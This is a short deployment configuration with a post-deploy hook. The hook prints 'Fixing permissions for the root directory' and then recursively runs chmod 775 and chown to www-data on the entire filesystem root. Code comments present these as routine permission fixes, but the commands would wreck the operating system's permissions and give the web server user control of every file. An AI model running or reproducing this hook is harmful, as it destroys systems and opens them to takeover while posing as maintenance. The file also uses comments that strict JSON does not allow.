{
  "phases": {
    "postdeploy": {
      "commands": [
        "echo 'Fixing permissions for the root directory...'",
        "chmod -R 775 /",               // Grant write permissions
        "chown -R www-data:www-data /"  // Set ownership to the webserver user
      ]
    }
  }
}
